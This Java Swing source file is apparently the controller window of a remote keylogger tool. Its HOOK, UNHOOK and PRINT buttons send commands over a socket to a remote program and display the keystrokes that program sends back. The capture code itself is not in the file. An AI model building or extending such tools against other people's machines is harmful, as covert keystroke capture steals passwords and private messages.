package Client;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
public class keylog extends javax.swing.JFrame {
    public keylog() {
        initComponents();
    }
    private void initComponents() {

        KeylogBox = new JTextArea("");
        butHook = new JButton();
        butUnhook = new JButton();
        butPrint = new JButton();
        butErase = new JButton();

        setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
        setTitle("Keylog");
        setPreferredSize(new Dimension(558, 326));
        setResizable(false);
        addWindowListener(new WindowAdapter() {
            public void windowClosing(WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        KeylogBox.setAlignmentX(SwingConstants.TOP);
        KeylogBox.setLineWrap(true);
        KeylogBox.setBackground(Color.WHITE);
        KeylogBox.setEditable ( false );
        KeylogBox.setBorder(BorderFactory.createEtchedBorder());

        butHook.setText("HOOK");
        butHook.setFont(new Font("Arial", 1,11));
        butHook.setCursor(new Cursor(Cursor.HAND_CURSOR));
        butHook.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                butHookActionPerformed(evt);
            }
        });

        butUnhook.setText("UNHOOK");
        butUnhook.setFont(new Font("Arial", 1,11));
        butUnhook.setCursor(new Cursor(Cursor.HAND_CURSOR));
        butUnhook.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                butUnhookActionPerformed(evt);
            }
        });

        butPrint.setText("PRINT");
        butPrint.setFont(new Font("Arial", 1,11));
        butPrint.setCursor(new Cursor(Cursor.HAND_CURSOR));
        butPrint.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                butPrintActionPerformed(evt);
            }
        });

        butErase.setText("DELETE");
        butErase.setFont(new Font("Arial", 1,11));
        butErase.setCursor(new Cursor(Cursor.HAND_CURSOR));
        butErase.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                butEraseActionPerformed(evt);
            }
        });

        GroupLayout layout = new GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
                layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                        .addGroup(layout.createSequentialGroup()
                                .addGap(21, 21, 21)
                                .addComponent(KeylogBox, GroupLayout.PREFERRED_SIZE, 372, GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false)
                                        .addComponent(butHook, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                        .addComponent(butUnhook, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                        .addComponent(butPrint, GroupLayout.DEFAULT_SIZE, 138, Short.MAX_VALUE)
                                        .addComponent(butErase, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                                .addContainerGap(15, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
                layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                        .addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                .addContainerGap(61, Short.MAX_VALUE)
                                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                                        .addComponent(KeylogBox, GroupLayout.Alignment.TRAILING, GroupLayout.PREFERRED_SIZE, 238, GroupLayout.PREFERRED_SIZE)
                                        .addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                                .addComponent(butHook, GroupLayout.PREFERRED_SIZE, 48, GroupLayout.PREFERRED_SIZE)
                                                .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                                                .addComponent(butUnhook, GroupLayout.PREFERRED_SIZE, 48, GroupLayout.PREFERRED_SIZE)
                                                .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                                                .addComponent(butPrint, GroupLayout.PREFERRED_SIZE, 48, GroupLayout.PREFERRED_SIZE)
                                                .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                                                .addComponent(butErase, GroupLayout.PREFERRED_SIZE, 48, GroupLayout.PREFERRED_SIZE)
                                                .addGap(16, 16, 16)))
                                .addGap(27, 27, 27))
        );
        pack();
    }
    private void formWindowClosing(java.awt.event.WindowEvent evt) {
        try {
            Program.out.writeUTF("QUIT");
            Program.out.flush();
        }
        catch (IOException e) {
            JOptionPane.showMessageDialog(null, "Something went wrong!" , "ERROR", JOptionPane.INFORMATION_MESSAGE);
        }
    }
    private void butHookActionPerformed(java.awt.event.ActionEvent evt) {
        try {
            Program.out.writeUTF("HOOK");
            Program.out.flush();
        }
        catch (IOException e) {
            JOptionPane.showMessageDialog(null, "Something went wrong!" ,
                    "ERROR", JOptionPane.INFORMATION_MESSAGE);
        }
    }
    private void butUnhookActionPerformed(java.awt.event.ActionEvent evt) {
        try {
            Program.out.writeUTF("UNHOOK");
            Program.out.flush();
        }
        catch (IOException e) {
            JOptionPane.showMessageDialog(null, "Something went wrong!" ,
                    "ERROR", JOptionPane.INFORMATION_MESSAGE);
        }
    }
    private void butPrintActionPerformed(java.awt.event.ActionEvent evt) {
        try {
            Program.out.writeUTF("PRINT");
            Program.out.flush();

            String str = Program.in.readUTF();
            KeylogBox.setFont(new Font("Arial", 1, 15));
            KeylogBox.setText(KeylogBox.getText()+str);
        }
        catch (IOException e) {
            JOptionPane.showMessageDialog(null, "Something went wrong!" ,
                    "ERROR", JOptionPane.INFORMATION_MESSAGE);
        }
    }
    private void butEraseActionPerformed(java.awt.event.ActionEvent evt) {
        KeylogBox.setText("");
    }

    public static void main(String args[]) {
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(keylog.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(keylog.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(keylog.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(keylog.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new keylog().setVisible(true);
            }
        });
    }
    private javax.swing.JTextArea KeylogBox;
    private javax.swing.JButton butErase;
    private javax.swing.JButton butHook;
    private javax.swing.JButton butPrint;
    private javax.swing.JButton butUnhook;
}
